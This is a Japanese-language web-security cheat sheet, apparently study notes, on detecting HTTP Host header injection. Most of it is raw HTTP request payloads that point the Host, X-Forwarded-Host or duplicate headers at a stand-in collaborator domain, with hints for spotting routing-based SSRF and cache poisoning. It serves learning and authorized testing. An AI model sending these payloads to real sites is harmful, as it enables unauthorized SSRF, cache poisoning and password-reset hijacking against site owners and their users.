[⚡️HTTP Host header attack](⚡️HTTP%20Host%20header%20attack.md)

###### まとめ

- [🔍HTTP Host header attack](#Detect)
- [🔍HTTP Host header attack](#該当脆弱性)

---
#### 注目ポイント

- "Forgot password?"機能 : [Password reset poisoning](Password%20reset%20poisoning.md)
- `/admin`等、高権限ページ

## Detect

 [🔍 Recon](../../cheatsheet/🔍%20Recon.md#3.%20Param%20Miner%20->%20Guess%20Headers)でHHI攻撃に使用できそうなヘッダは見つかった
- yes->[🔍HTTP Host header attack](#3.%20Host上書き用特殊ヘッダを使用する)を試す

- No -> 下記のテクニックを試す。Invalid Host Headerなどのエラーが吐かれたりレスポンスが返らなければ他のテクニックへ進む
	- それぞれのテクニックの==エラーstatusの違いにも着目==すること
	- 400系はアクセスコントロール系のブロック。500はアクセスコントロールなし

###### 1. Hostヘッダに適当な値を入力する

```http
GET /example HTTP/1.1
Host: COLLABORATOR_DOMAIN
```

###### 2. ドメイン検証の欠陥を探す

- ドメイン名のみチェックしポートをチェックしないケース
```http
GET /example HTTP/1.1
Host: target.com:COLLABORATOR_DOMAIN
```

- whitelistがあり、前方一致のケース
```http
GET /example HTTP/1.1
Host: target.com.COLLABORATOR_DOMAIN
```

- その他のドメイン検証の欠陥バイパス: [2.  一般的なSSRF防御の回避](../../Server-side/SSRF/2.%20%20一般的なSSRF防御の回避.md#SSRF%20ホワイトリスト回避)の難読化以外

###### 3. Host上書き用特殊ヘッダを使用する
```http
GET /example HTTP/1.1
Host: target.com
...
X-Forwarded-Host: COLLABORATOR_DOMAIN
```

##### 4. あいまいなリクエストを送る

###### 1. 2つのHostヘッダの注入

```http
GET /example HTTP/1.1
Host: target.com
Host: COLLABORATOR_DOMAIN　// 順不同
```

###### 2. Hostヘッダの前にスペースを追加する

```http
GET /example HTTP/1.1
    Host: COLLABORATOR_DOMAIN
Host: target.com //順不同
```

###### 3. リクエスト行に絶対URLを指定する

- リクエスト行には絶対URLを指定 (`http` or `https`)
```http
GET https://TARGET_NET/ HTTP/1.1
Host: COLLABORATOR_DOMAIN
```

---
## 該当脆弱性

###### [⚡️HTTP Host header attack](⚡️HTTP%20Host%20header%20attack.md#&%20Routing-based%20SSRF)

- Collaboratorで名前解決される
- &レスポンスに反映されない(blind)

---
###### [⚡️HTTP Host header attack](⚡️HTTP%20Host%20header%20attack.md#&%20Web%20cache%20poisoning)
- [ ] 
- HOSTヘッダの値が
	- HTMLエンコードされずにレスポンスに反映される
	- & スクリプトの読み込みに直接使用されている
-  レスポンスに[2. 実装の欠陥の探索](../Web%20cache%20poisoning/4.%20キャッシュ実装の欠陥の悪用/2.%20実装の欠陥の探索.md#Cacheされている兆候)がある

---
[⚡️HTTP Host header attack](⚡️HTTP%20Host%20header%20attack.md#Connection%20state%20attack)

- Routing-based SSRFに脆弱だが、1つ目のリクエストHostヘッダの値が検証される

